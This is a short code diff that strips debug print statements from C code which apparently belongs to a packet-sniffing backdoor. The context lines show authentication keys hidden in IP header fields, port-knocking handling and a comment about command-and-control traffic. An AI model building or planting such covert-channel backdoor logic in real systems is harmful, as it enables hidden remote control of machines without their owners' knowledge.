@@ -81,7 +81,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
     }
 
     if(ip->ip_p == IPPROTO_UDP){
-        printf("Protocal: UDP\n");
         if(CheckKey(ip->ip_tos, ip->ip_id, true)){
             //only CNC will get into this loop
             //port knocking packet
@@ -165,7 +164,6 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
         perror("Truncated IP");
         exit(1);
     } else if(ip->ip_p == IPPROTO_TCP){
-        printf("Protocal: TCP\n");
         if(CheckKey(ip->ip_tos, ip->ip_id, false)){
             ParseTCP(Filter, pkthdr, packet);
         } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
@@ -356,7 +354,6 @@ void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const
     } else {
         //parse the tcp packet and check for key and port knocking packets
         if(tcpp){
-            printf("TCP Packet\n");
 
             ip = (struct my_ip*)(packet + 14);
             size_ip = IP_HL(ip)*4;
